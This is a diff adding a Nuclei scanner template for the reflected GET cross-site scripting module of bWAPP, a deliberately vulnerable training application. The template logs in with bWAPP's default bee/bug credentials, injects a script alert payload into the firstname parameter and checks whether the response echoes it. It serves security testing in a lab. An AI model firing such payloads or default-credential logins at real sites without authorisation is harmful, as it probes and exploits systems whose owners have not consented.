@@ -1,0 +1,34 @@
+id: bwapp-xss-reflected-get
+
+info:
+  name: bWAPP - Cross-Site Scripting Reflected (GET)
+  author: anderson-steven
+  severity: high
+  description: |
+    Custom template for bWAPP's "XSS - Reflected (GET)" module. Requires an authenticated
+    session (logs in with the default bee/bug credentials first). At security level Low, the
+    `firstname` GET parameter of xss_get.php is echoed back into the response without any
+    output encoding, allowing arbitrary script injection.
+  reference:
+    - https://github.com/raesene/bWAPP/blob/master/app/xss_get.php
+  tags: xss,bwapp,custom,reflected
+
+http:
+  - cookie-reuse: true
+    method: POST
+    path:
+      - "{{BaseURL}}/login.php"
+    headers:
+      Content-Type: application/x-www-form-urlencoded
+    body: "login=bee&password=bug&security_level=0&form=submit"
+
+  - cookie-reuse: true
+    method: GET
+    path:
+      - "{{BaseURL}}/xss_get.php?firstname=<script>alert(document.domain)</script>&lastname=nuclei&form=submit"
+
+    matchers:
+      - type: word
+        part: body
+        words:
+          - "<script>alert(document.domain)</script>"
